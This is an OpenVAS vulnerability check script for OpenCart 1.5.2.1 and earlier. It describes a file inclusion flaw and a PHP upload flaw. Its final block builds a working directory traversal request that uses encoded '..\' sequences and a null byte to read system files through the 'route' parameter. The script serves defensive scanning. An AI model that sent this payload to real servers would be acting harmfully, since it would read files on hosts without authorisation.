##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_opencart_mult_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# OpenCart Multiple Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
################################i###############################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to upload PHP scripts and
  include arbitrary files from local resources via directory traversal attacks.
  Impact Level: Application";
tag_affected = "OpenCart version 1.5.2.1 and prior";
tag_insight = "The flaws are due to
  - An input passed via the 'route' parameter to index.php is not properly
    verified before being used to include files.
  - 'admin/controller/catalog/download.php' script does not properly validate
    uploaded files, which can be exploited to execute arbitrary PHP code by
    uploading a PHP file with an appended '.jpg' file extension.";
tag_solution = "No solution or patch is available as of 26th, April 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.opencart.com/index.php?route=download/download";
tag_summary = "This host is running OpenCart and is prone to multiple
  vulnerabilities.";

if(description)
{
  script_id(802751);
  script_version("$Revision: 12 $");
  script_bugtraq_id(52957);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-04-18 18:47:56 +0530 (Wed, 18 Apr 2012)");
  script_name("OpenCart Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/48762");
  script_xref(name : "URL" , value : "http://www.waraxe.us/advisory-84.html");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/522240");

  script_description(desc);
  script_summary("Check if OpenCart is vulnerable to directory traversal attack");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("opencart_detect.nasl");
  script_require_keys("OpenCart/installed");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
url = "";
dir = "";
file = "";
files = "";

## Get port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Get the dir for KB
if(!dir = get_dir_from_kb(port:port, app:"opencart")){
  exit(0);
}

## traversal_files() function Returns Dictionary (i.e key value pair)
## Get Content to be checked and file to be check
files = traversal_files();

foreach file (keys(files))
{
  ## Construct directory traversal attack
  url = string(dir, "/index.php?route=",
               crap(data:"..%5C",length:3*15),files[file],"%00");

  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:port, url:url,pattern:file, check_header:TRUE))
  {
    security_warning(port:port);
    exit(0);
  }
}
